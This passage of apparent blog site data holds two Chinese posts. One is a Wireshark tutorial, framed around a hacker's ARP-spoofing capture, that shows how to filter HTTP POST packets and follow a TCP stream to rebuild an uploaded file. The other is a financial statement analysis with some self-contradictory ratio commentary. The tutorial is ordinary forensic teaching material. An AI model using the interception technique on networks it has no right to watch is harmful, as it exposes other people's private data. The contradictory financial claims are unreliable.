注意的是，在保存之前一定要将数据的显示格式设置为“<mark>原始数据</mark>”。\n\n![](wireshark-跟踪数据流/2022-12-21-13-00-13-2022-09-13-23-46-04-image.png)\n\n这里将文件的扩展名指定为.bin，以使用二进制形式保存文件。\n","source":"_posts/wireshark-跟踪数据流.md","raw":"---\ntitle: wireshark 跟踪数据流\ndate: 2024-11-15 21:20:24\ntags: [web]\ncategories:\n- [web]\n---\n\nwireshark 跟踪数据流\n\n黑客A通过ARP欺骗，使用Wireshark获取了整个局域网内的网络流量信息。无意之中，他发现有人在某个网站上上传了一份文件。但是他不知道怎么样通过Wireshark去还原这份文件，没办法，他将监听到的数据包保存为了一份Wireshark的监听记录\n\n可以自己准备一张图片test.jpg，并随便找一个允许上传的网站，然后用Wireshark将上传的过程抓包，这里我已经将自己的抓包结果保存成文件catchme.pcapng\n\n使用显示过滤器进行过滤，由于上传文件采用的是HTTP协议，因而使用过滤规则“http”，过滤之后发现数据包由原来的344个变成了137个，这样就很容易帮我们分析了。仔细分析，我们会在第209条数据包的info中看到upload这个词，我们怀疑这条就是涉及到上传的数据包。\n\n由于上传文件都是采用POST方法，因而我们也可以使用过滤规则“http.request.method==POST”进行更精确的过滤，这时就只有47个数据包了。因而掌握数据包过滤，是熟练掌握Wireshark的必备技能之一。\n\n虽然我们看到了有upload关键字，有POST方法，但是我们不能确定是不是真的就是上传文件的那个请求。双击第209号数据包进行专门分析，在应用层数据中可以看到确实是上传了文件，而且文件名是test.jpg。\n\n![](wireshark-跟踪数据流/2022-12-21-12-58-41-2022-09-13-23-43-43-image.png)\n\n在传输层部分可以看到，由于文件比较大，TCP协议将其分成了16个数据段Segment，每个数据段都是一个独立的数据包，点击各个Frame，就可以看到数据包中的内容。\n\n![](wireshark-跟踪数据流/2022-12-21-12-59-14-2022-09-13-23-44-29-image.png)\n\n但问题是每个数据包中都只包含了上传文件的一部分，要想还原上传的文件，就必须将这些被分片的数据包重新组合成一个整体。在Wireshark中提供了一项“数据流追踪”功能，就可以来完成这项任务。\n\n回到Wireshark的主界面，在209号数据包上点击右键，选择“追踪流/TCP流”，\n\n![](wireshark-跟踪数据流/2022-12-21-12-59-47-2022-09-13-23-49-12-image.png)\n\n这时整个TCP流就会在一个单独的窗口中显示出来，我们注意到这个窗口中的文件以两种颜色显示，其中红色用来标明从源地址前往目的地址的流量，而蓝色用来区分出相反方向也就是从目的地址到源地址的流量。\n\n将数据流保存成原始文件，以便下一步处理。需要注意的是，在保存之前一定要将数据的显示格式设置为“<mark>原始数据</mark>”。\n\n![](wireshark-跟踪数据流/2022-12-21-13-00-13-2022-09-13-23-46-04-image.png)\n\n这里将文件的扩展名指定为.bin，以使用二进制形式保存文件。\n","slug":"wireshark-跟踪数据流","published":1,"updated":"2024-11-15T14:20:28.960Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2z000f8oi45j875zdp","content":"<p>wireshark 跟踪数据流</p>\n<p>黑客A通过ARP欺骗，使用Wireshark获取了整个局域网内的网络流量信息。无意之中，他发现有人在某个网站上上传了一份文件。但是他不知道怎么样通过Wireshark去还原这份文件，没办法，他将监听到的数据包保存为了一份Wireshark的监听记录</p>\n<p>可以自己准备一张图片test.jpg，并随便找一个允许上传的网站，然后用Wireshark将上传的过程抓包，这里我已经将自己的抓包结果保存成文件catchme.pcapng</p>\n<p>使用显示过滤器进行过滤，由于上传文件采用的是HTTP协议，因而使用过滤规则“http”，过滤之后发现数据包由原来的344个变成了137个，这样就很容易帮我们分析了。仔细分析，我们会在第209条数据包的info中看到upload这个词，我们怀疑这条就是涉及到上传的数据包。</p>\n<p>由于上传文件都是采用POST方法，因而我们也可以使用过滤规则“http.request.method&#x3D;&#x3D;POST”进行更精确的过滤，这时就只有47个数据包了。因而掌握数据包过滤，是熟练掌握Wireshark的必备技能之一。</p>\n<p>虽然我们看到了有upload关键字，有POST方法，但是我们不能确定是不是真的就是上传文件的那个请求。双击第209号数据包进行专门分析，在应用层数据中可以看到确实是上传了文件，而且文件名是test.jpg。</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-12-58-41-2022-09-13-23-43-43-image.png\" class=\"\">\n\n<p>在传输层部分可以看到，由于文件比较大，TCP协议将其分成了16个数据段Segment，每个数据段都是一个独立的数据包，点击各个Frame，就可以看到数据包中的内容。</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-12-59-14-2022-09-13-23-44-29-image.png\" class=\"\">\n\n<p>但问题是每个数据包中都只包含了上传文件的一部分，要想还原上传的文件，就必须将这些被分片的数据包重新组合成一个整体。在Wireshark中提供了一项“数据流追踪”功能，就可以来完成这项任务。</p>\n<p>回到Wireshark的主界面，在209号数据包上点击右键，选择“追踪流&#x2F;TCP流”，</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-12-59-47-2022-09-13-23-49-12-image.png\" class=\"\">\n\n<p>这时整个TCP流就会在一个单独的窗口中显示出来，我们注意到这个窗口中的文件以两种颜色显示，其中红色用来标明从源地址前往目的地址的流量，而蓝色用来区分出相反方向也就是从目的地址到源地址的流量。</p>\n<p>将数据流保存成原始文件，以便下一步处理。需要注意的是，在保存之前一定要将数据的显示格式设置为“<mark>原始数据</mark>”。</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-13-00-13-2022-09-13-23-46-04-image.png\" class=\"\">\n\n<p>这里将文件的扩展名指定为.bin，以使用二进制形式保存文件。</p>\n","excerpt":"","more":"<p>wireshark 跟踪数据流</p>\n<p>黑客A通过ARP欺骗，使用Wireshark获取了整个局域网内的网络流量信息。无意之中，他发现有人在某个网站上上传了一份文件。但是他不知道怎么样通过Wireshark去还原这份文件，没办法，他将监听到的数据包保存为了一份Wireshark的监听记录</p>\n<p>可以自己准备一张图片test.jpg，并随便找一个允许上传的网站，然后用Wireshark将上传的过程抓包，这里我已经将自己的抓包结果保存成文件catchme.pcapng</p>\n<p>使用显示过滤器进行过滤，由于上传文件采用的是HTTP协议，因而使用过滤规则“http”，过滤之后发现数据包由原来的344个变成了137个，这样就很容易帮我们分析了。仔细分析，我们会在第209条数据包的info中看到upload这个词，我们怀疑这条就是涉及到上传的数据包。</p>\n<p>由于上传文件都是采用POST方法，因而我们也可以使用过滤规则“http.request.method&#x3D;&#x3D;POST”进行更精确的过滤，这时就只有47个数据包了。因而掌握数据包过滤，是熟练掌握Wireshark的必备技能之一。</p>\n<p>虽然我们看到了有upload关键字，有POST方法，但是我们不能确定是不是真的就是上传文件的那个请求。双击第209号数据包进行专门分析，在应用层数据中可以看到确实是上传了文件，而且文件名是test.jpg。</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-12-58-41-2022-09-13-23-43-43-image.png\" class=\"\">\n\n<p>在传输层部分可以看到，由于文件比较大，TCP协议将其分成了16个数据段Segment，每个数据段都是一个独立的数据包，点击各个Frame，就可以看到数据包中的内容。</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-12-59-14-2022-09-13-23-44-29-image.png\" class=\"\">\n\n<p>但问题是每个数据包中都只包含了上传文件的一部分，要想还原上传的文件，就必须将这些被分片的数据包重新组合成一个整体。在Wireshark中提供了一项“数据流追踪”功能，就可以来完成这项任务。</p>\n<p>回到Wireshark的主界面，在209号数据包上点击右键，选择“追踪流&#x2F;TCP流”，</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-12-59-47-2022-09-13-23-49-12-image.png\" class=\"\">\n\n<p>这时整个TCP流就会在一个单独的窗口中显示出来，我们注意到这个窗口中的文件以两种颜色显示，其中红色用来标明从源地址前往目的地址的流量，而蓝色用来区分出相反方向也就是从目的地址到源地址的流量。</p>\n<p>将数据流保存成原始文件，以便下一步处理。需要注意的是，在保存之前一定要将数据的显示格式设置为“<mark>原始数据</mark>”。</p>\n<img src=\"/2024/11/15/wireshark-%E8%B7%9F%E8%B8%AA%E6%95%B0%E6%8D%AE%E6%B5%81/2022-12-21-13-00-13-2022-09-13-23-46-04-image.png\" class=\"\">\n\n<p>这里将文件的扩展名指定为.bin，以使用二进制形式保存文件。</p>\n"},{"title":"一个经典的公司财务报表分析案例","date":"2024-11-15T13:43:10.000Z","_content":"\n财务报表的使用人有许多种，包括权益投资人、债权人、经理人员、政府机构和其他与企业有利益关系的人士。他们出于不同目的使用财务报表，需要不同的信息，采用不同的分析程序。\n\n(一)债权人\n\n债权人是指借款给企业并得到企业还款承诺的人。债权人关心企业是否具有偿还债务的能力。债权人可以分为短期债权人和长期债权人。\n\n债权人的主要决策：决定是否给企业提供信用，以及是否需要提前收回债权。他们进行财务报表分析是为了回答以下几方面的问题：\n\n1、公司为什么需要额外筹集资金;\n\n2、公司还本付息所需资金的可能来源是什么;\n\n3、公司对于以前的短期和长期借款是否按期偿还;\n\n4、公司将来在哪些方面还需要借款。\n\n(二)投资人\n\n投资人是指公司的权益投资人即普通股股东。普通股股东投资于公司的目的是扩大自己的财富。他们所关心的是包括偿债能力、收益能力以及投资风险等等。\n\n权益投资人进行财务报表分析，是为了回答以下几方面的问题：\n\n1、公司当前和长期的收益水平高低，以及公司收益是否容易受重大变动的影响;\n\n2、财务状况如何，公司资本结构决定的风险和报酬如何;\n\n3、与其他竞争者相比，公司处于何种地位。\n\n(三)经理人员\n\n经理人员是指被所有者聘用的、对公司资产和负债进行管理的个人组成的团体，有时称之为\"管理当局\"。\n\n经理人员关心公司的财务状况、盈利能力和持续发展的能力。经理人员可以获取外部使用人无法得到的内部信息。他们分析报表的主要目的是改善报表。\n\n(四)政府机构有关人士\n\n政府机构也是公司财务报表的使用人，包括税务部门、国有企业的管理部门、证券管理机构、会计监管机构和社会保障部门等。他们使用财务报表是为了履行自己的监督管理职责。\n\n(5) 其他人士\n\n财务报表分析对于了解企业的财务状况和经营业绩，评价企业的偿债能力和盈利能力，制定经济决策，都有着显着的作用。但由于种种因素的影响，财务报表分析及其分析方法，也存在着一定的局限性。在分析中，应注意这些局限性的影响，以保证分析结果的正确性。\n\n**（1）会计处理方法及分析方法对报表可比性的影响。**\n\n会计核算上不同的处理方法产生的数据会有差别。例如固定资产采用直线折旧法或采用加速折旧法，折旧费也不同。企业长期投资采用成本法与采用权益法所确认的投资收益也不一样。因此，如果企业前后期会计处理方法改变，对前后期财务报表对比分析就会有影响。同样，一个企业与另一个企业比较，如果两个企业对同一事项的会计处理采用的方法不一样，数据的可比性也会降低。所以在分析报表时，一定要注意看附注，看看企业使用的是什么方法以及方法有无变更等。\n\n从财务报表分析方法来看，某些指标计算方法不同也会给不同企业之间的比较带来不同程度的影响。例如应收账款周转率、存货周转率等，其平均余额的计算，报表使用者由于数据的限制，往往用年初数与年末数进行平均，这样平均计算应收账款余额与存货余额，在经营业务一年内各月各季较均衡的企业尚可，但在季节性经营的企业或各月变动情况较大的情况下，如期初与期末正好是经营旺季，其平均余额就会过大，如是淡季，则又会过小，从而影响到指标的准确性。\n\n此外，财务报表分析、指标评价要与其他企业以及行业平均指标比较才有意义。但各企业不同的情况，如环境影响、企业规模、会计核算方法的差别，会对可比性产生影响。而行业平均指标，往往是各种各样情况的综合或折衷，如果行业平均指标是采用抽样调查得到的，在抽到极端样本时，还会歪曲整个行业情况。因此，在对比分析时，应慎重使用行业平均指标，对不同企业进行比较时应注意调整一些不可比因素的影响。\n\n**（2）通货膨胀的影响。**\n\n由于中国的财务报表是按照历史成本原则编制的，在通货膨胀时期，有关数据会受到物价变动的影响，使其不能真实地反映企业的财务状况和经营成果，引起报表使用者的误解。例如，以历史成本为基础的资产价值必然小于资产当前的价值，以前以500万元购买的固定资产，重置成本可能为800万元，但账上及报表上仍反映为500万元固定资产原价。如不知道该资产是哪一年买的，仅仅靠这个数据，不能正确理解一个企业的生产规模。进一步说，折旧费是按固定资产原价提取的，利润是扣减这种折旧费计算出来的，由于折旧费定低了，企业将无力重置价格已上涨的资产；同时由于折旧费定低了，利润算多了，可能会导致企业多交所得税，多付利润，最终可能使企业的简单再生产也难以维持。\n\n**（3）信息的时效性问题。**\n\n财务报表中的数据，均是企业过去经济活动的结果。用这些数据来预测企业未来的动态，只有参考价值，并非绝对合理可靠。而且等报表使用者取得各种报表时，可能离报表编制日已过去多日。\n\n**（4）报表数据信息量的限制。**\n\n由于报表本身的原因，其提供的数据是有限的。对报表使用者来说，可能不少需要使用的信息，在报表或附注中找不到。\n\n**（5）报表数据的可靠性问题。**\n\n有时，企业为了使报表显示出企业良好的财务状况及经营成果，会在会计核算方法上采用其他手段来粉饰财务报表。这时财务报表分析就容易误入歧途。\n\n以上关于财务报表分析及其分析方法局限性的种种说明并不能否定财务报表分析的积极作用，了解这些局限性，分析报表时注意它们的影响，可以提高财务报表分析的质量。\n\n此外，报表使用者在阅读和分析企业财务报表时，一定不要忽略报表附表和附注。仔细阅读有关附表和附注，能使人们正确理解报表上所反映的信息，不至产生错误的判断和结论。同时，在阅读报表时，还应注意注册会计师\\\"审计报告\\\"的意见。注册会计师从第三者公正的立场，从专业人士的角度，对企业报表数据是否真实、可靠、可验证等方面的评价，对于报表使用者是很有用的。\n\n## **一个经典的公司财务报表分析案例，很详细！**\n\n会计学堂\n\n百家号18-09-0913:47\n\n标题说是经典的案例分析，实际上也就是一个普通的分析。会计的东西太多，教科书上的东东太多。而结合企业战略、市场的变化、同行的情况、内部的管理、制度以及会计政策，等方面，分析的太少。所以，本文仅适用于财务经理级别以下的人员，是有用的。可以上交给财务经理，供其进一步分析和提炼，才能上交到最高管理层。\n\n1.中色股份有限公司概况\n\n中国有色金属建设股份有限公司主要从事国际工程承包和有色金属矿产资源开发。1997年4月16日进行资产重组，剥离优质资产改制组建中色股份，并在深圳证券交易所挂牌上市。\n\n目前，中色股份旗下控股多个公司，涉及矿业、冶炼、稀土、能源电力等领域；同时，通过入股民生人寿等稳健的实业投资，增强企业的抗风险能力，实现稳定发展。\n\n2.资产负债比较分析\n\n资产负债增减变动趋势表\n\n![](一个经典的公司财务报表分析案例/2022-12-21-22-54-11-2022-08-21-17-05-59-image.png)\n\n01.增减变动分析\n\n从上表可以清楚看到，中色股份有限公司的资产规模是呈逐年上升趋势的。从负债率及股东权益的变化可以看出虽然所有者权益的绝对数额每年都在增长，但是其增长幅度明显没有负债增长幅度大，该公司负债累计增长了20.49%，而股东权益仅仅增长了13.96%，这说明该公司资金实力的增长依靠了较多的负债增长，说明该公司一直采用相对高风险、高回报的财务政策，一方面利用负债扩大企业资产规模，另一方面增大了该企业的风险。\n\n（1）资产的变化分析\n\n08年度比上年度增长了8%，09年度较上年度增长了9.02%；该公司的固定资产投资在09年有了巨大增长，说明09年度有更大的建设发展项目。总体来看，该公司的资产是在增长的，说明该企业的未来前景很好。\n\n（2）负债的变化分析\n\n从上表可以清楚地看到，该公司的负债总额也是呈逐年上升趋势的，08年度比07年度增长了13.74%，09年度较上年度增长了5.94%；从以上数据对比可以看到，当金融危机来到的08年，该公司的负债率有明显上升趋势，09年度公司有了好转迹象，负债率有所回落。我们也可以看到，08年当资产减少的同时负债却在增加，09年正好是相反的现象，说明公司意识到负债带来了高风险，转而采取了较稳健的财务政策。\n\n（3）股东权益的变化分析\n\n该公司08年与09年都有不同程度的上升，所不同的是，09年有了更大的增幅。而这个增幅主要是由于负债的减少，说明股东也意识到了负债带来的企业风险，也关注自己的权益，怕影响到自己的权益。\n\n02.短期偿债能力分析\n\n（1）流动比率\n\n该公司07年的流动比率为1.12，08年为1.04，09年为1.12，相对来说还比较稳健，只是08年度略有降低。1元的负债约有1.12元的资产作保障，说明企业的短期偿债能力相对比较平稳。\n\n（2）速动比率\n\n该公司07年的速动比率为0.89，08年为0.81，09年为0.86，相对来说，没有大的波动，只是略呈下降趋势。每1元的流动负债只有0.86元的资产作保障，是绝对不够的，这表明该企业的短期偿债能力较弱。\n\n（3）现金比率\n\n该公司07年的现金比率为0.35，08年为0.33，09年为0.38，从这些数据可以看出，该公司的现金即付能力较强，并且呈逐年上升趋势的，但是相对数还是较低，说明了一元的流动负债有0.38元的现金资产作为偿还保障，其短期偿债能力还是可以的。\n\n03.资本结构分析\n\n（1）资产负债率\n\n该企业的资产负债率07年为58.92%，08年为61.14%09年为59.42%。从这些数据可以看出，该企业的资产负债率呈现逐年上升趋势的，但是是稳中有降的，说明该企业开始调节自身的资本结构，以降低负债带来的企业风险，资产负债率越高，说明企业的长期偿债能力就越弱，债权人的保证程度就越弱。该企业的长期偿债能力虽然不强，但是该企业的风险系数却较低，对债权人的保证程度较高。\n\n（2）产权比率\n\n该企业的产权比率07年为138.46%，08年为157.37%，09年为146.39%。从这些数据可以看出，该企业的产权比率呈现逐年上升趋势的，但是稳中有降的，从该比率可以看出，该企业对负债的依赖度还是比较高的，相应企业的风险也较高。该企业的长期偿债能力还是较低的。不过，该企业已经意识到企业的风险不能过大，一旦过大将带来重大经营风险，所以，该企业试图从高风险、高回报的财务结构向较为保守的财务结构过渡，逐渐增大所有者权益比例。\n\n（3）权益乘数\n\n该企业的权益乘数07年为2.38，08年为2.57，09年为2.46。从这些数据可以看出，该企业的权益乘数呈现逐年上升趋势的，但是也是稳中有降的。说明一开始企业较多依赖负债，当意识到带来的企业风险也较大时，股东就加大了权益性资产投入，增大了权益性资本在资产总额中的比重，选择调整为稳健的财务结构，于是降低了权益乘数，使公司更好地利用财务杠杆的作用。\n\n04.长期偿债能力分析\n\n（1）利息保障倍数\n\n该企业的资产负债率07年为10.78，08年为2.92，09年为3.19。从这些数据可以看出，该企业的利息保障倍数呈现逐年下降的趋势。08年金融危机来的当年影响最大，后又缓慢上升，说明企业经营开始好转。利息保障倍数越高，说明企业偿还债务能力越有保障，该企业07年到09年期间，利润有了大幅下降，而同时财务费用却有进一步增长，对债务的偿还能力有所降低，所以应该要多加注意。\n\n（2）有形资产净值债务率\n\n该企业的有形资产净值债务率07年为203.64%，08年为227.15%，09年为205.51%。从这些数据可以看出，该企业的有形资产净值债务率是呈现逐年上升趋势的，但是也是稳中有降的。该项指标越大，企业的经营风险就越高，长期偿债能力就越弱。以上数据可以看出，该企业正在努力降低该指标，以进一步有效提高企业的长期偿债能力。\n\n## **看商誉排雷：如何从财务报表辨别\"地雷\"公司**\n\n启智得宁\n\n百家号18-12-1117:26\n\n随着中国经济国际化进程的不断推进，今年，一系列改革措施陆续推出，包括停复牌制度、回购制度，信息披露制度等，资本市场也逐步开始与国际接轨。中国股市也在一步步走向成熟，投资方式也会有别于以往，不可避免，价值投资会成为未来的主流。\n\n说到价值投资，那就离不开财务报表，中国会计准则发展要晚于国际主流国家，与国际接轨也是在加入WTO之后，直到现在仍然存在较多不完善的地方。\n\n会计准则的不完善外加上市公司财务报表粉饰的手段越来越多，让一些非专业的人士在做股票投资时频频踩雷，以下介绍商誉排雷的方式，让我们以后的投资路上少踩\"地雷\"。\n\n先说一下商誉的概念：一家公司收购另一家公司支付的价格超过被收购公司的公允价值部分叫商誉。举个例子,A公司收购B公司，假如B公司是上市公司，B市值是2亿，A公司出资2.5亿收购，那么商誉就是5000万。\n\n这里可简单理解为一个东西市场价值只值5块钱，但要花10块钱去买，多出来的部分就是商誉。为什么要多花钱去买呢，通常是因为被收购企业会与母公司产生协同效应，也就是1+1大于2的效应。\n\n但这也就产生了一个问题，如果被收购公司不能产生协同效应，且质地非常差，未来也不能给企业带来利润增长，但仍然花大价格去买，这中间很可能就涉及到利益输送。\n\n假如与上市公司高层有利益牵扯的人，随便做一家公司，之后上市公司有高价收购回去。这样就把上市公司的资金转移过去了，而通常来讲上市公司是全体股民所以，使用超过企业本身价值的高价收购损失的也是全体股民。完成上面这样的收购，通常就会产生商誉，商誉就会在母公司财务报表中体现出来。\n\n这个套路影视行业玩的最厉害，从行业的财务就看的出来，某上市公司影视娱乐公司旗下的艺人随便成立一个工作室，然后上市公司就斥巨资来收购，间接就完成了资产转移，这样在母公司财报里面产生天量商誉。大家可以看看，目前影视类公司的商誉普遍占净资产达到30%以上。如果两公司没任何协同效应，这些商誉价值也就为零，但仍几十上百亿的挂在资产负债表中的资产项目中。而且这些商誉地未来公司赚钱时还会做减值测试，也就是说会从利润里面扣除，直接就影响公司净利润。\n\n因此，在做投资时，很简单，打开财务报表，翻到资产负债表，看资产项目下商誉有多少，再看商誉占净资产的比率，只要占比达到10%以上的就可以排除，或许可能错过一些好公司，但绝对能规避一大批成心思不正的上市公司。\n","source":"_posts/一个经典的公司财务报表分析案例.md","raw":"---\ntitle: 一个经典的公司财务报表分析案例\ndate: 2024-11-15 21:43:10\ntags:\ncategories:\n- [other]\n---\n\n财务报表的使用人有许多种，包括权益投资人、债权人、经理人员、政府机构和其他与企业有利益关系的人士。他们出于不同目的使用财务报表，需要不同的信息，采用不同的分析程序。\n\n(一)债权人\n\n债权人是指借款给企业并得到企业还款承诺的人。债权人关心企业是否具有偿还债务的能力。债权人可以分为短期债权人和长期债权人。\n\n债权人的主要决策：决定是否给企业提供信用，以及是否需要提前收回债权。他们进行财务报表分析是为了回答以下几方面的问题：\n\n1、公司为什么需要额外筹集资金;\n\n2、公司还本付息所需资金的可能来源是什么;\n\n3、公司对于以前的短期和长期借款是否按期偿还;\n\n4、公司将来在哪些方面还需要借款。\n\n(二)投资人\n\n投资人是指公司的权益投资人即普通股股东。普通股股东投资于公司的目的是扩大自己的财富。他们所关心的是包括偿债能力、收益能力以及投资风险等等。\n\n权益投资人进行财务报表分析，是为了回答以下几方面的问题：\n\n1、公司当前和长期的收益水平高低，以及公司收益是否容易受重大变动的影响;\n\n2、财务状况如何，公司资本结构决定的风险和报酬如何;\n\n3、与其他竞争者相比，公司处于何种地位。\n\n(三)经理人员\n\n经理人员是指被所有者聘用的、对公司资产和负债进行管理的个人组成的团体，有时称之为\"管理当局\"。\n\n经理人员关心公司的财务状况、盈利能力和持续发展的能力。经理人员可以获取外部使用人无法得到的内部信息。他们分析报表的主要目的是改善报表。\n\n(四)政府机构有关人士\n\n政府机构也是公司财务报表的使用人，包括税务部门、国有企业的管理部门、证券管理机构、会计监管机构和社会保障部门等。他们使用财务报表是为了履行自己的监督管理职责。\n\n(5) 其他人士\n\n财务报表分析对于了解企业的财务状况和经营业绩，评价企业的偿债能力和盈利能力，制定经济决策，都有着显着的作用。但由于种种因素的影响，财务报表分析及其分析方法，也存在着一定的局限性。在分析中，应注意这些局限性的影响，以保证分析结果的正确性。\n\n**（1）会计处理方法及分析方法对报表可比性的影响。**\n\n会计核算上不同的处理方法产生的数据会有差别。例如固定资产采用直线折旧法或采用加速折旧法，折旧费也不同。企业长期投资采用成本法与采用权益法所确认的投资收益也不一样。因此，如果企业前后期会计处理方法改变，对前后期财务报表对比分析就会有影响。同样，一个企业与另一个企业比较，如果两个企业对同一事项的会计处理采用的方法不一样，数据的可比性也会降低。所以在分析报表时，一定要注意看附注，看看企业使用的是什么方法以及方法有无变更等。\n\n从财务报表分析方法来看，某些指标计算方法不同也会给不同企业之间的比较带来不同程度的影响。例如应收账款周转率、存货周转率等，其平均余额的计算，报表使用者由于数据的限制，往往用年初数与年末数进行平均，这样平均计算应收账款余额与存货余额，在经营业务一年内各月各季较均衡的企业尚可，但在季节性经营的企业或各月变动情况较大的情况下，如期初与期末正好是经营旺季，其平均余额就会过大，如是淡季，则又会过小，从而影响到指标的准确性。\n\n此外，财务报表分析、指标评价要与其他企业以及行业平均指标比较才有意义。但各企业不同的情况，如环境影响、企业规模、会计核算方法的差别，会对可比性产生影响。而行业平均指标，往往是各种各样情况的综合或折衷，如果行业平均指标是采用抽样调查得到的，在抽到极端样本时，还会歪曲整个行业情况。因此，在对比分析时，应慎重使用行业平均指标，对不同企业进行比较时应注意调整一些不可比因素的影响。\n\n**（2）通货膨胀的影响。**\n\n由于中国的财务报表是按照历史成本原则编制的，在通货膨胀时期，有关数据会受到物价变动的影响，使其不能真实地反映企业的财务状况和经营成果，引起报表使用者的误解。例如，以历史成本为基础的资产价值必然小于资产当前的价值，以前以500万元购买的固定资产，重置成本可能为800万元，但账上及报表上仍反映为500万元固定资产原价。如不知道该资产是哪一年买的，仅仅靠这个数据，不能正确理解一个企业的生产规模。进一步说，折旧费是按固定资产原价提取的，利润是扣减这种折旧费计算出来的，由于折旧费定低了，企业将无力重置价格已上涨的资产；同时由于折旧费定低了，利润算多了，可能会导致企业多交所得税，多付利润，最终可能使企业的简单再生产也难以维持。\n\n**（3）信息的时效性问题。**\n\n财务报表中的数据，均是企业过去经济活动的结果。用这些数据来预测企业未来的动态，只有参考价值，并非绝对合理可靠。而且等报表使用者取得各种报表时，可能离报表编制日已过去多日。\n\n**（4）报表数据信息量的限制。**\n\n由于报表本身的原因，其提供的数据是有限的。对报表使用者来说，可能不少需要使用的信息，在报表或附注中找不到。\n\n**（5）报表数据的可靠性问题。**\n\n有时，企业为了使报表显示出企业良好的财务状况及经营成果，会在会计核算方法上采用其他手段来粉饰财务报表。这时财务报表分析就容易误入歧途。\n\n以上关于财务报表分析及其分析方法局限性的种种说明并不能否定财务报表分析的积极作用，了解这些局限性，分析报表时注意它们的影响，可以提高财务报表分析的质量。\n\n此外，报表使用者在阅读和分析企业财务报表时，一定不要忽略报表附表和附注。仔细阅读有关附表和附注，能使人们正确理解报表上所反映的信息，不至产生错误的判断和结论。同时，在阅读报表时，还应注意注册会计师\\\"审计报告\\\"的意见。注册会计师从第三者公正的立场，从专业人士的角度，对企业报表数据是否真实、可靠、可验证等方面的评价，对于报表使用者是很有用的。\n\n## **一个经典的公司财务报表分析案例，很详细！**\n\n会计学堂\n\n百家号18-09-0913:47\n\n标题说是经典的案例分析，实际上也就是一个普通的分析。会计的东西太多，教科书上的东东太多。而结合企业战略、市场的变化、同行的情况、内部的管理、制度以及会计政策，等方面，分析的太少。所以，本文仅适用于财务经理级别以下的人员，是有用的。可以上交给财务经理，供其进一步分析和提炼，才能上交到最高管理层。\n\n1.中色股份有限公司概况\n\n中国有色金属建设股份有限公司主要从事国际工程承包和有色金属矿产资源开发。1997年4月16日进行资产重组，剥离优质资产改制组建中色股份，并在深圳证券交易所挂牌上市。\n\n目前，中色股份旗下控股多个公司，涉及矿业、冶炼、稀土、能源电力等领域；同时，通过入股民生人寿等稳健的实业投资，增强企业的抗风险能力，实现稳定发展。\n\n2.资产负债比较分析\n\n资产负债增减变动趋势表\n\n![](一个经典的公司财务报表分析案例/2022-12-21-22-54-11-2022-08-21-17-05-59-image.png)\n\n01.增减变动分析\n\n从上表可以清楚看到，中色股份有限公司的资产规模是呈逐年上升趋势的。从负债率及股东权益的变化可以看出虽然所有者权益的绝对数额每年都在增长，但是其增长幅度明显没有负债增长幅度大，该公司负债累计增长了20.49%，而股东权益仅仅增长了13.96%，这说明该公司资金实力的增长依靠了较多的负债增长，说明该公司一直采用相对高风险、高回报的财务政策，一方面利用负债扩大企业资产规模，另一方面增大了该企业的风险。\n\n（1）资产的变化分析\n\n08年度比上年度增长了8%，09年度较上年度增长了9.02%；该公司的固定资产投资在09年有了巨大增长，说明09年度有更大的建设发展项目。总体来看，该公司的资产是在增长的，说明该企业的未来前景很好。\n\n（2）负债的变化分析\n\n从上表可以清楚地看到，该公司的负债总额也是呈逐年上升趋势的，08年度比07年度增长了13.74%，09年度较上年度增长了5.94%；从以上数据对比可以看到，当金融危机来到的08年，该公司的负债率有明显上升趋势，09年度公司有了好转迹象，负债率有所回落。我们也可以看到，08年当资产减少的同时负债却在增加，09年正好是相反的现象，说明公司意识到负债带来了高风险，转而采取了较稳健的财务政策。\n\n（3）股东权益的变化分析\n\n该公司08年与09年都有不同程度的上升，所不同的是，09年有了更大的增幅。而这个增幅主要是由于负债的减少，说明股东也意识到了负债带来的企业风险，也关注自己的权益，怕影响到自己的权益。\n\n02.短期偿债能力分析\n\n（1）流动比率\n\n该公司07年的流动比率为1.12，08年为1.04，09年为1.12，相对来说还比较稳健，只是08年度略有降低。1元的负债约有1.12元的资产作保障，说明企业的短期偿债能力相对比较平稳。\n\n（2）速动比率\n\n该公司07年的速动比率为0.89，08年为0.81，09年为0.86，相对来说，没有大的波动，只是略呈下降趋势。每1元的流动负债只有0.86元的资产作保障，是绝对不够的，这表明该企业的短期偿债能力较弱。\n\n（3）现金比率\n\n该公司07年的现金比率为0.35，08年为0.33，09年为0.38，从这些数据可以看出，该公司的现金即付能力较强，并且呈逐年上升趋势的，但是相对数还是较低，说明了一元的流动负债有0.38元的现金资产作为偿还保障，其短期偿债能力还是可以的。\n\n03.资本结构分析\n\n（1）资产负债率\n\n该企业的资产负债率07年为58.92%，08年为61.14%09年为59.42%。从这些数据可以看出，该企业的资产负债率呈现逐年上升趋势的，但是是稳中有降的，说明该企业开始调节自身的资本结构，以降低负债带来的企业风险，资产负债率越高，说明企业的长期偿债能力就越弱，债权人的保证程度就越弱。该企业的长期偿债能力虽然不强，但是该企业的风险系数却较低，对债权人的保证程度较高。\n\n（2）产权比率\n\n该企业的产权比率07年为138.46%，08年为157.37%，09年为146.39%。从这些数据可以看出，该企业的产权比率呈现逐年上升趋势的，但是稳中有降的，从该比率可以看出，该企业对负债的依赖度还是比较高的，相应企业的风险也较高。该企业的长期偿债能力还是较低的。不过，该企业已经意识到企业的风险不能过大，一旦过大将带来重大经营风险，所以，该企业试图从高风险、高回报的财务结构向较为保守的财务结构过渡，逐渐增大所有者权益比例。\n\n（3）权益乘数\n\n